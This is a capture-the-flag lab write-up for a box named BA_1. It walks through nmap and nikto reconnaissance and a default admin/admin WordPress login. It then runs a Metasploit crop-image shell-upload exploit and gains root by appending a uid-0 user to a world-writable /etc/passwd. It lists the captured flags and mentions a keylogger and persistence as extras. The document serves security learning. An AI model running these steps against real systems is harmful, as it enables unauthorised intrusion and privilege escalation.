# BA_1 Box Report

## Part 1: finding IP

1.  my ip -> 192.168.110.131 (from `ifconfig`)
2.  `nmap -sP 192.168.110.1/24`
    -   192.168.110.2, 192.168.110.129, 192.168.110.131 ip present -> guess target IP `192.168.110.129`

## Part 2: finding for vulnerabilities

1.  `nmap -sV -p- -A --open 192.168.110.129`
    -   port 21 (ftp) -> ProFTPD 1.3.3c -> possible backdoor -> https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor/
        -   proftpd is backdoored (`nmap --script ftp-proftpd-backdoor -p 21 192.168.110.129`)
    -   port 80 (http) -> Apache httpd 2.4.18 ((Ubuntu))
2.  `nmap --script vuln 192.168.110.129`
    -   LIKELY VULNERABLE -> Slowloris DOS attack (CVE-2007-6750)
3.  `nikto scan -h http://192.167.110.129`
    -   interesting -> /secret/ -> wordpress landing page
        -   wordpress 4.9.18 (from view page source)
        -   username: admin ; password: admin (by manual trail and error)
        -   found [this](https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce/) by googling (only once then had to reinstall the VM for additional exploit of the same kind)

## Part 3: Exploit

-   Exploit used [WordPress Crop-image Shell Upload for Wordpress versions 5.0.0 and <= 4.9.8](https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce/)

1. `msfconsole`
    - `use exploit/multi/http/wp_crop_rce`
    - `show options`
    - `set PASSWORD admin`
    - `set RHOSTS 192.168.110.129`
    - `set TARGETURI /secret/`
    - `set USERNAME admin`
    - `exploit`

## Part 4: Privilege escalation

1. started from www-data
2. found `/etc/passwd` write permission is open to all -> added a new user
    - added `"indishell:$1$abc$66P0kBoPMsKgk3H5bxZFv/:0:0:indishell,,,:/home/indishell:/bin/bash"` in the end of the file
    - Username: indishell
    - Password: pass123
        - password generated by `openssl passwd -1 -salt abc pass123`
3. `su indishell` to gain root access
4. changed marlinspike passwd to pass123 and sucessfully able to login the computer

## Part 5: Finding flags

-   found flags 1 and 3 during privilege escalation

    -   Flag1: TA21{HAHAHA_Easy_you_thought} (in /home/marlinspike)
    -   Flag3: TA21{ROOOTE333D} (in /root)

-   `find / -iname flag*`
    -   Flag2: TA21{Flagg3d_nice+one} (in `/var/flag/flag2`)

## Ending Note

-   Plan was to find all flags and root privilege and it has been successfully achieved

Extra Things that could be done

-   Keylogger
-   Persistence Meterpreter install
-   SSH setup
-   etc.